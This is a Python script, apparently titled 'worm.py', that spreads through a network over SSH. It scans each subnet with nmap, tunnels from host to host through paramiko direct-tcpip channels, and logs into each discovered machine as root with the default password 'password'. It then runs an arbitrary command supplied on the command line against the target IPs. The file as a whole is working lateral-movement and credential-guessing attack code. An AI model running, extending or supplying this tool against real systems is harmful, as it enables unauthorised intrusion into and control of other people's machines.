import socket
import sys
import os
from dotenv import load_dotenv
from typing import Tuple, List

import paramiko
from cryptography.fernet import Fernet
from paramiko.channel import ChannelFile
from paramiko.ssh_exception import ChannelException, SSHException

load_dotenv()

key = Fernet.generate_key()
username = os.getenv('USERNAME')
password = os.getenv('PASSWORD')

ip_set = set()
connected_ip_set = set()

ssh_clients = []
ssh_channels = []


def first_connect_ssh() -> paramiko.SSHClient:
    """
    Establishes the first SSH connection to the localhost.
    Returns:
        paramiko.SSHClient
    """
    global ssh_clients

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        hostname="localhost",
        port=22,
        username=username,
        password=password,
        look_for_keys=False,
        allow_agent=False
    )
    ssh_clients.append(client)
    _, first_ip = get_current_ips(client)
    connected_ip_set.add(first_ip)
    return client


def connect_transport(client: paramiko.SSHClient, connect_ip: str, current_ip: str) -> paramiko.SSHClient or str:
    """
    Establishes an SSH connection through a transport channel to a specified IP address.
    Args:
        client (client.get_transport): The current SSH client for setting up the transport.
        connect_ip (str): Target host's IP address to connect to.
        current_ip (str): Current client's IP address.
    Returns:
        If host unreachable:
            str: "host unreachable"
        Else:
            paramiko.SSHClient: A new SSH client object connected to the target host.
    """
    global ssh_clients, ssh_channels, ip_set, connected_ip_set

    try:
        transport = client.get_transport()
        channel = transport.open_channel(kind='direct-tcpip', dest_addr=(connect_ip, 22), src_addr=(current_ip, 22))
    except (ChannelException, SSHException):
        return "host unreachable"

    remote_client = paramiko.SSHClient()
    remote_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        remote_client.connect(connect_ip, port=22, username='root', password='password', sock=channel, timeout=30)
        ssh_clients.append(remote_client)
        ssh_channels.append(channel)
        connected_ip_set.add(connect_ip)
    except paramiko.AuthenticationException:
        print("Authentication failed. Please check your username/password.")
    except paramiko.ssh_exception.NoValidConnectionsError:
        print("The connection could not be established within the allotted time.")
    except SSHException as e:
        print(f"SSH error connecting:{e}")
    except Exception as e:
        print(f"Connection error:{e}")

    return remote_client


def get_current_ips(client: paramiko.SSHClient) -> Tuple[List[str], str]:
    """
    Retrieves the current IPs from the SSH client.
    Args:
        client (paramiko.SSHClient): The SSH client.
    Returns:
        Tuple[List[str], str]: A tuple containing a list of current IPs and the primary current IP.
    """
    _, stdout, _ = client.exec_command("hostname -I")
    current_ips = stdout.read().decode("utf-8").split()
    return current_ips, current_ips[0]


def get_hostname(client: paramiko.SSHClient) -> str:
    """
    Retrieves the hostname from the SSH client.
    Args:
        client (paramiko.SSHClient): The SSH client.
    Returns:
        str: The hostname.
    """
    _, stdout, _ = client.exec_command("hostname")
    return stdout.read().decode("utf-8").strip()


def execute_command(client: paramiko.SSHClient, console_command: str) -> str:
    """
    Executing the command on the host.
    Args:
        client (paramiko.SSHClient): The SSH client.
        console_command: Command from the console.
    Returns:
        str: Output of the command result.
    """
    _, stdout, _ = client.exec_command(console_command)
    return stdout.read().decode("utf-8").strip()


def get_active_ip(current_ip: str, client: paramiko.SSHClient) -> ChannelFile:
    """
    Retrieves active IP addresses in the network using nmap.
    Args:
        current_ip (str): The current IP address.
        client (paramiko.SSHClient): The SSH client.
    Returns:
        str: Active IP addresses obtained from the nmap scan.
    """
    get_mask_command = "ifconfig | grep -B1 'inet " + current_ip + "' | grep 'inet ' | awk '{print $4}'"
    _, stdout, _ = client.exec_command(get_mask_command)
    mask = stdout.read().decode("utf-8").strip()
    if mask == "255.255.255.0" or mask == "255.255.0.0":
        mask = ".0/24"
    octets = current_ip.split('.')
    ip_cidr = '.'.join(octets[:-1]) + mask
    terminal_command = "nmap -sn " + ip_cidr + r" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'"
    _, stdout, _ = client.exec_command(terminal_command)
    return stdout


def find_hostname(console_ip: str, console_command: str) -> str:
    """
    Finds the hostname for a given IP address. It first establishes an SSH connection,
    then iterates through IPs obtained from the network to find the corresponding hostname.
    Args:
        console_ip (str): The IP address for which the hostname needs to be found.
        console_command: Command from the console.
    Returns:
        If console_command == "hostname"
            str: The hostname for the given IP address. Returns "host unreachable" if the hostname
                 cannot be determined or if the host is unreachable.
        Else:
            Execution of the command after switching to the specified ip.
    """
    global ssh_clients, ssh_channels, ip_set, hostname_ip_table

    client = first_connect_ssh()

    while True:
        current_ips, current_ip = get_current_ips(client)

        for current_ip in current_ips:
            if current_ip not in ip_set:
                current_hostname = get_hostname(client)
                if current_hostname in hostname_ip_table:
                    hostname_ip_table[current_ip] = current_hostname
                else:
                    hostname_ip_table[current_ip] = current_hostname
                ip_set.add(current_ip)
            if current_ip == console_ip:
                current_hostname = execute_command(client, console_command)
                return current_hostname

        stdout = get_active_ip(current_ip, client)
        arp_scan = stdout.read().decode("utf-8")
        arp_scan_list_ip = [arp_scan_ip.strip() for arp_scan_ip in arp_scan.split('\n') if arp_scan_ip.strip()]
        first_count = len(connected_ip_set)
        for scan_ip in arp_scan_list_ip[:-1]:  # in list the first is current and the last is gateway
            if scan_ip not in connected_ip_set:
                remote_client = connect_transport(client, scan_ip, current_ip)
                if remote_client == "host unreachable":
                    return "host unreachable"
                client = remote_client
                break
        second_count = len(connected_ip_set)
        if first_count == second_count:
            return "host unreachable"


if __name__ == "__main__":
    hostname_ip_table = dict()

    try:
        command = sys.argv[1]
        ip_list = sys.argv[2].split(',')
        for ip in ip_list:
            try:
                socket.inet_aton(ip)
            except socket.error:
                print(f"{ip} is not valid!")
                break

            output_command = find_hostname(ip, command)
            if command == "hostname":
                if ip in connected_ip_set and ip_list.index(ip) > 0:
                    print(f"{ip} returned:\n{hostname_ip_table[ip]}")
                if output_command == "host unreachable":
                    print(f"{ip} - host unreachable")
                else:
                    print(f"{ip} returned:\n{output_command}")
            else:
                print(f"{ip} returned:\n{output_command}")

        [client.close() for client in ssh_clients]
        [channel.close() for channel in ssh_channels]
    except IndexError:
        print("Please write all arguments: worm.py <command> <list of IP addresses separated by commas>")
